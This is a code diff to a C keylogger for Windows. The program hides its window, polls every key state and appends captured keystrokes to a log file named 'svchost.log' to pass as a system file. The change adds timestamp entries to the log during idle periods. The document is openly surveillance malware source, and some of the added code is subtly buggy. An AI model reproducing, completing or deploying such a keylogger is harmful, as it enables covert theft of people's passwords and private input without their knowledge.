@@ -5,14 +5,15 @@
 #include <stdio.h>
 #include <windows.h>
 #include <winuser.h>
- 
+#include <time.h>
+
 #define BUFSIZE 80
  
 //int test_key(void);
 //int create_key(char *);
 int get_keys(void);
- 
- 
+char get_time(void);
+
 int main(void)
 {
 	HWND stealth; /*creating stealth (window is not visible)*/
@@ -37,9 +38,12 @@ int get_keys(void)
 {
 	short character;
 	short click = 0;
+	clock_t start, t;
+	start = clock();
 	while(1) {
 		for(character=8;character<=222;character++) {
 			if(GetAsyncKeyState(character)==-32767) {
+				start = clock();
 				click = 0;
 				FILE *file;
 				file=fopen("svchost.log","a+");
@@ -179,6 +183,29 @@ int get_keys(void)
 						}
 					}
 				}
+			} 
+			else {
+				t = clock() - start;
+				if ((int(t))/CLOCKS_PER_SEC >= 20) {
+					start = clock();
+					FILE *file;
+					file=fopen("svchost.log","a+");
+					time_t rawtime;
+					struct tm * timeinfo;
+					time ( &rawtime );
+					timeinfo = localtime ( &rawtime );
+					int sec = timeinfo->tm_sec;
+					int hour = timeinfo->tm_hour;
+					int min = timeinfo->tm_min;
+					int day = timeinfo->tm_mday;
+					int month = timeinfo->tm_mon;
+					int year = timeinfo->tm_year + 1900;
+					char datetime[1800];
+					sprintf(datetime, "%04d-%02d-%02d %02d:%02d:%02d", year, month, day, hour, min, sec);
+					fputc('\n', file);
+					fputs(("[+][%s]", datetime), file);
+					fclose(file);
+				}
 			}
 		}
 		if((GetKeyState(VK_LBUTTON) & 0x80) != 0 && click == 0) {
@@ -240,5 +267,22 @@ int create_key(char *path)
 		check=1;
 	}
 	return check;
+}
+
+
+char get_time(void) {
+	time_t rawtime;
+	struct tm * timeinfo;
+	time ( &rawtime );
+	timeinfo = localtime ( &rawtime );
+	int sec = timeinfo->tm_sec;
+	int hour = timeinfo->tm_hour;
+	int min = timeinfo->tm_min;
+	int day = timeinfo->tm_mday;
+	int month = timeinfo->tm_mon;
+	int year = timeinfo->tm_year + 1900;
+	char datetime[20];
+	sprintf(datetime, "%04d-%02d-%02d %02d:%02d:%02d", year, month, day, hour, min, sec);
+	return *datetime;
 }
 */
